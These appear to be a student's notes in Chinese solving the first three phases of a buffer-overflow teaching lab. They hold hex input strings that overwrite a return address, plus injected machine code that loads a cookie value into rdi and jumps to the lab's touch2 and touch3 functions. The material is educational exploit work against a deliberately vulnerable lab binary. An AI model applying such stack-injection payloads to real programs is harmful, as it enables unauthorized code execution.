Task1:
    00 11 22 33 44 55 66 77 88 99 00 11 22 33 44 55 66 77 88 99 00 11 22 33 44 55 66 77 88 99 00 11 22 33 44 55 66 77 88 99 c0 17 40 00

Task2:
    需要在溢出之后注入一个函数，这个函数（设置 rdi = cookie ），然后再注入返回值
    要注入的是：
        void my_func() {
            set rdi = cookie
            调用函数 touch2
        } // rsp = 0x5561dc78
           0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
           7:   68 ec 17 40 00          push   $0x4017ec
           c:   c3                      ret
        程序 tm 是从小到大执行的，不是从上到下。内存是从下到上增长的，意味着需要将程序翻转
        a0 dc 61 55
        48 c7 c7 fa 97 b9 59
        68 ec 17 40 00
        c3
        00 00 00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00

Task3:
    溢出后，转移到 my_func 函数，执行以下操作
        set str = cookie(string) // 需要将 str 存放到 test 函数的栈区，不然会被覆盖掉
        set rdi = *str
        call touch3
    内存如下：（cookie字符串为 "59b997fa" ）
        '5' '9' ... '\0'
        mov pos('5') rdi
        pushq <touch3>
        ret
    机器码如下：
           0:   48 c7 c7 78 dc 61 55    mov    $0x5561dc78,%rdi
           7:   68 fa 18 40 00          push   $0x4018fa
           c:   c3                      ret
        78 dc 61 55 00 00 00 00 // 这里多加 4 个 0B 是因为，读取返回地址时一次性读 8 字节，所以需要将后四个字节设为 0 （ 64 位机器 = 8 * 1B（8byte） ）
        35 39 62 39 39 37 66 61 00